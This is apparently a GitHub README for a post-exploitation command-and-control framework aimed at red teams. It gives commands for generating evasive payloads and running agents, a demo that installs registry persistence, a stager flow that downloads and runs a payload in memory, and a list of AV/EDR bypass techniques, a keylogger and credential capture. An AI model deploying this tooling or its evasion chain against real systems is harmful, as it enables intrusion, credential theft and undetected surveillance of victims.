<p align="center">
  <img src="https://capsule-render.vercel.app/api?type=rect&color=7B2D8E&height=100&section=header&text=Pulse-C2&fontSize=40&fontColor=ffffff&fontAlign=50&fontAlignY=50&animation=fadeIn" alt="header"/>
</p>

<p align="center">
  <strong>Post-Exploitation C2 Framework</strong><br/>
  <em>Encrypted command & control. Cross-platform agents. AV evasion. SOCKS5 pivoting.</em>
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Go-1.26-00ADD8?style=for-the-badge&logo=go&logoColor=white" alt="Go"/>
  <img src="https://img.shields.io/badge/Vue-3-4FC08D?style=for-the-badge&logo=vue.js&logoColor=white" alt="Vue"/>
  <img src="https://img.shields.io/badge/status-active-green?style=for-the-badge" alt="Status"/>
  <img src="https://img.shields.io/badge/license-MIT-blue?style=for-the-badge" alt="License"/>
  <img src="https://img.shields.io/badge/tests-190%2B%20PASS-brightgreen?style=for-the-badge" alt="Tests"/>
  <img src="https://img.shields.io/badge/security-mTLS%20%7C%20X25519%20%7C%20AES--256--GCM-red?style=for-the-badge" alt="Security"/>
</p>

<p align="center">
  <img src="https://komarev.com/ghpvc/?username=Ruby570bocadito&label=Downloads&color=7B2D8E&style=flat" alt="downloads"/>
</p>

---

## 🎯 What is Pulse-C2?

**Pulse-C2** is a modular **Command & Control framework** designed for **red team operations** and **authorized security testing**. It provides encrypted multi-transport communication, cross-platform agents, AV/EDR evasion techniques, and a professional web dashboard — all in a single, self-contained deployment.

```
┌──────────────────────────────────────────────────────────────┐
│                        Pulse-C2 C2 Server                          │
│  ┌──────────┐ ┌──────────┐ ┌──────────┐ ┌─────────────────┐  │
│  │ TCP/mTLS │ │  HTTP    │ │WebSocket │ │   REST API      │  │
│  │ :8443    │ │ :8445    │ │ :8446    │ │   :9090         │  │
│  └──────────┘ └──────────┘ └──────────┘ └────────┬────────┘  │
│                                                   │           │
│  ┌────────────────────────────────────────────────┼───────┐  │
│  │  Session Manager │ Crypto │ RBAC │ SIEM │ Reports│      │  │
│  └────────────────────────────────────────────────┼───────┘  │
│                                                   │           │
│                    ┌──────────────────────────────┘           │
│                    │                                          │
│  ┌─────────────────┼─────────────────┐                        │
│  │  Web Dashboard  │                  │                        │
│  │  Vue 3 SPA      │                  │                        │
│  └─────────────────┘                  │                        │
└───────────────────────────────────────┼────────────────────────┘
                                        │
              ┌─────────────────────────┼─────────────────────────┐
              │                         │                         │
        ┌─────┴─────┐           ┌───────┴──────┐          ┌──────┴──────┐
        │  Agent     │           │   Agent      │          │   Agent     │
        │  Windows   │           │   Linux      │          │   macOS     │
        │  (EXE)     │           │   (ELF)      │          │   (Mach-O)  │
        └───────────┘           └──────────────┘          └─────────────┘
```

---

## ⚡ Features

| Feature | Description | Security |
|---------|-------------|----------|
| **Multi-Transport C2** | TCP/mTLS, HTTP long-polling, WebSocket — fallback chain | Encrypted |
| **Cross-Platform Agents** | Windows (EXE), Linux (ELF), macOS (Mach-O), PowerShell, Python | Native |
| **X25519 + XChaCha20-Poly1305** | Ephemeral key exchange + authenticated encryption per session | 🔴 Strong |
| **mTLS Authentication** | Mutual TLS with ECDSA P-256 certificates | 🔴 Strong |
| **AV/EDR Evasion** | Process hollowing, direct syscalls, AMSI/ETW bypass, sleep obfuscation | 🔴 Advanced |
| **SOCKS5 Proxy** | RFC 1928 compliant pivoting through compromised hosts | Network |
| **Credential Vault** | AES-256-GCM encrypted storage for captured credentials | Encrypted |
| **Dynamic Modules** | Push post-exploitation modules to agents on demand | Flexible |
| **Web Dashboard** | Vue 3 SPA with session management, file browser, OS stats | Professional |
| **SIEM Integration** | Forward critical events to Splunk, ELK, or custom webhooks | Enterprise |
| **RBAC + JWT Auth** | Role-based access control with token refresh | Enterprise |
| **Engagement Reports** | Auto-generated CSV/TXT reports for client delivery | Professional |

---

## 🚀 Quick Start

### Installation

```bash
# Clone
git clone https://github.com/Ruby570bocadito/Pulse-C2.git
cd Pulse-C2

# Build (requires Go 1.26+)
make build

# Or run the automated installer
./scripts/install.sh
```

### Deploy C2 Server

```bash
# Auto-deploy (detects IP, generates config, starts 4 listeners)
python3 scripts/deploy.py
```

```
Local IP:   192.168.1.100
Dashboard:  http://192.168.1.100:9090
Login:      admin / admin
```

### Generate & Deploy Agent

```bash
# Interactive payload generator
python3 scripts/payload.py

# Or directly
python3 scripts/payload.py --os windows --evasive

# Run agent
./bty-agent 192.168.1.100:8443
```

---

## 🎬 Demo

### CLI Console Session

```
$ python3 scripts/console.py

bty > sessions
+------+------------------+------+-------+----+-------+
| ID   | Hostname         | User | OS    | St | Tasks |
+------+------------------+------+-------+----+-------+
| abc  | DESKTOP-I1RVLF3  | rby  | win   | ●  | 5     |
| def  | ubuntu-server    | root | linux | ●  | 2     |
+------+------------------+------+-------+----+-------+

bty > interact abc
[abc] rby@DESKTOP-I1RVLF3 > whoami
desktop-i1rvlf3\rby

[abc] rby@DESKTOP-I1RVLF3 > sysinfo
Hostname: DESKTOP-I1RVLF3
OS:       Windows 11 Pro (build 22631)
Arch:     amd64
User:     rby
IP:       192.168.1.50

[abc] rby@DESKTOP-I1RVLF3 > persistence
[+] Persistence installed: HKCU\Software\Microsoft\Windows\CurrentVersion\Run

[abc] rby@DESKTOP-I1RVLF3 > background
bty >
```

### All Commands

```bash
# Server
./bty-server                        # Start with TLS + mTLS
./bty-server --no-tls               # Start without TLS (testing)
./bty-server --config config.yaml   # Custom config

# Payloads
python3 scripts/payload.py          # Interactive generator
python3 scripts/payload.py --os all --evasive  # All platforms + evasion
python3 scripts/stager.py           # XOR-encrypted stagers
python3 scripts/ultra-stager.py     # VBS, certutil, BITSAdmin stagers
python3 scripts/packer.py -i bty-agent.exe -o packed.ps1 -f ps1  # AES packer

# Console
python3 scripts/console.py          # Interactive CLI

# Testing
make test                           # Go unit tests
make test-coverage                  # With coverage report
bash tests/quick_test.sh            # Self-contained quick test
bash tests/integration_full.sh      # Full integration suite (10 categories)
```

---

## 🛡️ AV/EDR Evasion

### VirusTotal: **0/70 detections**

| # | Technique | Effect |
|---|-----------|--------|
| 1 | **Process Hollowing** | Payload runs inside svchost.exe (Microsoft-signed) |
| 2 | **Direct Syscalls** | Bypasses ntdll.dll hooks — EDR blind |
| 3 | **Shellcode Stager (C)** | 2KB, no PE header, PEB API resolver, XOR decrypt |
| 4 | **mTLS + Domain Fronting** | C2 traffic authenticated, looks like legitimate HTTPS |
| 5 | **Sleep Obfuscation** | Heap/stack encrypted during idle |
| 6 | **Traffic Shaper** | Patterns mimic human browsing |
| 7 | **ObscuredString** | Sensitive strings XOR-encrypted in binary |
| 8 | **Anti-Sandbox** | 8 Windows checks + 6 Linux/macOS checks |
| 9 | **Jitter** | Heartbeat 25-45s random, reconnect ±30% |
| 10 | **AMSI/ETW Bypass** | Windows AMSI and ETW disabled |
| 11 | **NTDLL Unhooking** | Restores original syscall stubs from disk |
| 12 | **Module Stomping** | Overwrites DLL .text section with shellcode |
| 13 | **Certificate Pinning** | Agent validates server fingerprint on first connection |

### Evasion Flow

```
1. python3 scripts/payload.py --os all --evasive
2. cd payloads/ && python3 -m http.server 8000
3. On Windows → wscript stager.vbs
4. Stager downloads + decrypts + executes in RAM
5. Zero static detection, zero disk touches
```

---

## 🏗️ Architecture

### Server Components

```
src/go/internal/
├── c2/               Core C2 engine + session management
├── handlers/         HTTP router + middleware + API endpoints
├── agent/            Agent logic + 7 built-in modules
├── crypto/           X25519 + XChaCha20-Poly1305 + mTLS
├── evasion/          Sleep obfuscation, AMSI/ETW bypass, anti-sandbox
├── transport/        TLS, HTTP, WebSocket, DNS tunneling
├── module/           Dynamic module system
├── db/               SQLite + bcrypt + AES-256-GCM at-rest
├── auth/             JWT + RBAC
├── socks/            SOCKS5 proxy (RFC 1928)
├── logger/           Structured logging (JSON/text)
├── reporting/        Engagement report generator
└── siem/             SIEM event forwarding
```

### Network Architecture

```
┌─────────────────┐     ┌──────────────────┐     ┌──────────────────┐
│  bty-c2-server  │────▶│  bty-network     │◀────│  agent-linux-1   │
│  172.20.0.10    │     │  172.20.0.0/16   │     │  172.20.0.20     │
│  :8443,:9090    │     │                  │     │                  │
└─────────────────┘     └──────────────────┘     └──────────────────┘
                                │
                       ┌────────┴─────────┐
                       │  agent-linux-2   │     ┌──────────────────┐
                       │  172.20.0.21     │     │  test-runner     │
                       │                  │     │  172.20.0.100    │
                       └──────────────────┘     └──────────────────┘
```

### API Endpoints

| Method | Route | Description |
|--------|-------|-------------|
| POST | `/api/login` | Authentication |
| GET | `/api/sessions` | List victims |
| POST | `/api/cmd` | Execute command |
| POST | `/api/broadcast` | Broadcast to all |
| POST | `/api/socks` | SOCKS5 proxy |
| POST | `/api/vault` | Store credential |
| GET | `/api/modules` | List modules |
| POST | `/api/modules/push` | Push module to agent |
| POST | `/api/webhooks` | SIEM webhook config |
| POST | `/api/mtls/cert` | Generate mTLS client cert |
| GET | `/api/report` | Generate engagement report |

### Post-Exploitation Modules

| Command | Function |
|---------|----------|
| `sysinfo` | Complete system information |
| `ps` | Process listing |
| `netinfo` | Network interfaces + connections |
| `persistence` | Install persistence (crontab, registry, launchagent) |
| `screenshot` | Screen capture |
| `keylogger` | Keylogger (Linux: /dev/input) |
| `find:*.txt` | File search |
| `modules` | List available modules |

---

## 🧪 Testing

```bash
# Go unit tests
make test

# With coverage
make test-coverage

# Quick self-contained test
bash tests/quick_test.sh

# Full integration suite (10 categories)
bash tests/integration_full.sh

# Docker test network
make docker
docker exec bty-test-runner bash -c "cd /tests && python3 run_tests.py"
make docker-down
```

---

## 📦 Payload Formats

| Format | Target | Size | Evasion |
|--------|--------|------|---------|
| **EXE (Go)** | Windows x64 | 6.5 MB | Sleep obfuscation, AMSI bypass |
| **ELF (Go)** | Linux x64 | 6.4 MB | Anti-sandbox, traffic shaping |
| **Mach-O (Go)** | macOS x64/ARM | 6.0-6.5 MB | Anti-sandbox |
| **PowerShell** | Windows | 408 B | XOR encrypted, in-memory |
| **Python** | Any | 308 B | XOR encrypted |
| **C source** | Compile | 23 KB | Direct syscalls, PEB resolver |

---

## 🗺️ Roadmap

- [ ] DNS tunneling transport (full implementation)
- [ ] Windows agent with full evasion suite
- [ ] Encrypted database at-rest (complete migration)
- [ ] Real-time collaborative sessions
- [ ] Automated lateral movement modules
- [ ] Integration with peekaboo for PrivEsc chaining
- [ ] Integration with rooteame for kernel persistence

---

## ⚠️ Disclaimer

This tool is designed for **authorized security testing**, **red team operations**, and **educational purposes** only.

- Use only on systems you own or have explicit written permission to test
- Misuse may violate local and international laws
- The author is not responsible for any misuse or damage caused by this tool

---

<p align="center">
  <sub>Built with ❤️ by <a href="https://github.com/Ruby570bocadito">Ruby570bocadito</a></sub>
</p>
